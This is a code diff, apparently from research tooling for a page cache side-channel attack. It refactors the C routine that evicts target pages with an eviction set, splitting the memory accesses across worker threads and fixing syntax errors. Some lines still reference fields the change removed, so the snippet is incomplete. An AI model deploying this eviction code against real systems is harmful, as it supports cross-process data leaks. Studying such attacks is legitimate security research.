@@ -968,15 +968,13 @@ size_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *t
 }
 
 
-size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr)
+size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr)
 {
-    volatile uint8_t tmp = 0;
-    (void)tmp;
     ssize_t accessed_mem = 0;
 
     // flag eviction running
     __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
-    evictTargets__(attack, target_ev)
+    accessed_mem = evictTargets__(attack, targets_evicted_fn, targets_evicted_arg_ptr, 0, attack->eviction_set_.mapping_.size_);
     // flag eviction done
     __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);
 
@@ -984,11 +982,15 @@ size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *
 }
 
 
-size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr, size_t ) 
-{
+size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr, 
+    size_t access_offset, size_t access_len)
+{ 
+    volatile uint8_t tmp = 0;
+    (void)tmp;
     size_t accessed_mem = 0;
 
-    for (size_t p = 0; p < attack->eviction_set_.mapping_.size_pages_; p++)
+
+    for (size_t pos = access_offset; pos < (access_offset + access_len); pos += PAGE_SIZE)
     {
         // access ws
         if (accessed_mem % attack->eviction_set_.ws_access_all_x_bytes_ == 0)
@@ -999,7 +1001,7 @@ size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void 
         // prefetch larger blocks (more efficient IO)
         if (accessed_mem % attack->eviction_set_.prefetch_es_bytes_ == 0)
         {
-            if(adviseFileUsage(&attack->eviction_set_.mapping_, accessed_mem, 
+            if(adviseFileUsage(&attack->eviction_set_.mapping_, access_offset + accessed_mem, 
                 attack->eviction_set_.prefetch_es_bytes_, USAGE_WILLNEED) != 0)
             {
                 DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
@@ -1010,8 +1012,8 @@ size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void 
         if(!attack->eviction_set_.use_file_api_) 
         {
 #ifdef __linux
-            if (pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 ||
-                pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 )
+            if (pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, pos) != 1 ||
+                pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, pos) != 1 )
             {
                 // in case of error just print warnings and access whole ES
                 DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at pread...\n", OSAL_EC));
@@ -1022,12 +1024,12 @@ size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void 
         }
         else 
         {
-            tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
+            tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + pos);
         }
 
         // check if evicted
         if (accessed_mem % attack->eviction_set_.targets_check_all_x_bytes_ == 0 &&
-            target_evicted_fn(target_evicted_arg_ptr))
+            targets_evicted_fn(targets_evicted_arg_ptr))
         {
           break;
         }
@@ -1036,12 +1038,13 @@ size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void 
     }
 
     // remove eviction set to release pressure
-    if(adviseFileUsage(&attack->eviction_set_.mapping_, 0, 
-                attack->eviction_set_.mapping_.size_, USAGE_DONTNEED) != 0)
+    if(adviseFileUsage(&attack->eviction_set_.mapping_, access_offset, 
+                access_len, USAGE_DONTNEED) != 0)
     {
         DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
     }
 
+    return accessed_mem;
 }
 
 
@@ -1055,10 +1058,14 @@ size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, 
     // resume worker threads
     for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
     {
+        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
+        // needed for eviction stop condition
+        thread_data->targets_evicted_fn_ = target_evicted_fn;
+        thread_data->targets_evicted_arg_ptr_ = target_evicted_arg_ptr;
         // in case of error skip
         if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
         {
-            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_post...\n", strerror(errno));
+            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_post...\n", strerror(errno)));
             continue;
         }
     }
@@ -1069,7 +1076,7 @@ size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, 
         // in case of error skip
         if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
         {
-            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_wait...\n", strerror(errno));
+            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_wait...\n", strerror(errno)));
             continue;
         }
 
@@ -1088,8 +1095,9 @@ size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, 
 int spawnESThreads(Attack *attack)
 {
     int ret = 0;
-    size_t processed_pages = 0;
+    size_t pos = 0;
     size_t pages_per_thread_floor = attack->eviction_set_.mapping_.size_pages_ / attack->eviction_set_.access_thread_count_;
+    size_t access_range_per_thread = pages_per_thread_floor * PAGE_SIZE;
 
     //  reserve space for access thread data structures
     if (dynArrayResize(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_) == NULL)
@@ -1103,50 +1111,38 @@ int spawnESThreads(Attack *attack)
     {
         PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
         initPageAccessThreadESData(thread_data);
-        thread_data->attack = attack;
-        thread_data->page_offset_ = processed_pages;
-        thread_data->size_pages_ = pages_per_thread_floor;
-        thread_data->target_addr_ = target_addr;
+        thread_data->attack_ = attack;
+        thread_data->access_offset_ = pos;
+        thread_data->access_len_ = access_range_per_thread;
         thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
         thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;
-        processed_pages += pages_per_thread_floor;
+        pos += access_range_per_thread;
     }
     // prepare thread_data object for last thread
-    PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, attack->eviction_set_.->access_thread_count_ - 1);
+    PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_ - 1);
     initPageAccessThreadESData(thread_data);
-    thread_data->attack = attack;
-    thread_data->page_offset_ = processed_pages;
-    thread_data->size_pages_ = pages_per_thread_floor;
-    thread_data->target_addr_ = target_addr;
+    thread_data->attack_ = attack;
+    thread_data->access_offset_ = pos;
+    thread_data->access_len_ = access_range_per_thread;
     thread_data->start_sem_ = &attack->eviction_set_.worker_start_sem_;
     thread_data->join_sem_ = &attack->eviction_set_.worker_join_sem_;
 
     // spin up worker threads
-    for (size_t t = 0; t < attack->eviction_set_.->access_thread_count_; t++)
+    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
     {
-        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.->access_threads_, t);
+        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
         if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadES, thread_data) != 0)
         {
             printf(FAIL "Error (%s) at creating ES access thread...\n", strerror(errno));
             goto error;
         }
-
-        // increase to next core if wanted
-        if ((t + 1) % attack->eviction_set_.->access_threads_per_pu_ == 0)
-        {
-            // NOTE has to be locked when accessed concourrently in future
-            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
-        }
     }
 
     goto cleanup;
-
 error:
     ret = -1;
-    dynArrayDestroy(&attack->eviction_set_.->access_threads_, closePageAccessThreadESData);
-
+    dynArrayDestroy(&attack->eviction_set_.access_threads_, closePageAccessThreadESData);
 cleanup:
-    pthread_attr_destroy(&thread_attr);
 
     return ret;
 }
@@ -1154,29 +1150,28 @@ cleanup:
 
 void *pageAccessThreadES(void *arg)
 {
-    PageAccessThreadESData *page_thread_data = arg;
+    PageAccessThreadESData *thread_data = arg;
+    Attack *attack = thread_data->attack_;
     size_t accessed_mem = 0;
-    volatile uint8_t tmp = 0;
-    (void)tmp;
 
     DEBUG_PRINT((DEBUG ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) running on core %d.\n",
-           page_thread_data->page_offset_, page_thread_data->size_pages_, sched_getcpu()));
+           thread_data->page_offset_, thread_data->size_pages_, sched_getcpu()));
     while (__atomic_load_n(&running, __ATOMIC_RELAXED))
     {
-        if (sem_wait(page_thread_data->start_sem_) != 0)
+        if (sem_wait(thread_data->start_sem_) != 0)
         {
             DEBUG_PRINT((DEBUG ES_THREAD_TAG "Error (%s) at sem_wait (%p)...\n", strerror(errno), (void *)page_thread_data->start_sem_));
             goto error;
         }
 
-
+        accessed_mem = evictTargets__(attack, thread_data->targets_evicted_fn_, thread_data->targets_evicted_arg_ptr_, thread_data->access_offset_, thread_data->access_len_);
 
         DEBUG_PRINT((DEBUG ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) accessed %zu kB.\n",
-                     page_thread_data->page_offset_, page_thread_data->size_pages_, accessed_mem / 1024));
-        page_thread_data->accessed_mem_ = accessed_mem;
-        if (sem_post(page_thread_data->join_sem_) != 0)
+                     thread_data->page_offset_, thread_data->size_pages_, accessed_mem / 1024));
+        thread_data->accessed_mem_ = accessed_mem;
+        if (sem_post(thread_data->join_sem_) != 0)
         {
-            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_post (%p)...\n", strerror(errno), (void *)page_thread_data->join_sem_);
+            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_post (%p)...\n", strerror(errno), (void *)thread_data->join_sem_);
             goto error;
         }
     }
